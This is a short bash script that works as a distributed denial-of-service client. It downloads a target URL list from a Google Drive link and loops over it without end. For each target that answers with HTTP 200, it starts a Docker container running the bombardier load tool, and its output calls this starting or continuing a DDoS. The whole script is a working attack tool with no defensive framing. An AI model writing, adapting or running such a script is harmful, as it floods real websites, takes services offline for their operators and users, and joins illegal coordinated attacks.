#!/bin/bash
source "$(dirname $0)/config"

if [ ! -x "$(command -v docker)" ]; then
	echo "Docker is not installed"
	exit
fi
if [ "$EUID" -ne 0 ] && (! getent group docker | grep -q "\b$USER\b"); then
	echo "The user has no permissions to manage Docker"
  	exit
fi

TARGETS="https://drive.google.com/uc?id=$(echo $TARGETS | grep -oP '(?<=d/).*(?=/view)')"

while true; do
	echo "Updating targets from URL"
	until SOURCE_URLS=$(wget -qO- "$TARGETS"); do
		echo "Failed. Retrying"
		sleep 10
	done
	echo "Processing targets"
	SOURCE_URLS=$(echo "$SOURCE_URLS" | sort | uniq | shuf)
	for url in $SOURCE_URLS; do
		printf "* $url - "
		response=$(curl -sLo /dev/null -w ''%{http_code}'' -m "$TIMEOUT" "$url")
		container="${PREFIX}$(echo "$url" | awk -F/ '{print $3}')"
		if [ "$response" -eq 200 ]; then
			printf "UP, start/continue DDoS\n"
			docker run --name "$container" --rm -d alpine/bombardier -c "$CONNECTIONS" -d "${DURATION}s" "$url" >/dev/null 2>&1
		else
			printf "DOWN\n"
		fi
	done
done
